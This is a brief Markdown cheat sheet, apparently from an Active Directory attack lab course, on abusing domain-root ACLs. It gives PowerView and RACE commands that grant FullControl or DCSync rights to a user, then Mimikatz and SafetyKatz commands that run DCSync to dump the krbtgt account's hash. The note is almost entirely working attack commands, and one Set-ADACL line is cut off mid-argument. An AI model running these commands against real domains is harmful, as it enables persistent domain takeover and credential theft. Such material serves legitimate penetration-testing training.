# Rights Abuse using ACLs 

Tags: #AD #Windows #Powershell 

```bash 
- There are even more interesting ACLs which can be abused.
- For example, with DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run "DCSync".
```

```powershell 
# Add FullControl rights:
❯ Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Using ActiveDirectory Module and RACE:
❯ Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose
```

```powershell 
# Add rights for DCSync:
❯ Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Using ActiveDirectory Module and RACE:
❯ Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,
```

```powershell 
# Execute DCSync:
❯ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'  

❯ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"   # Another form 
```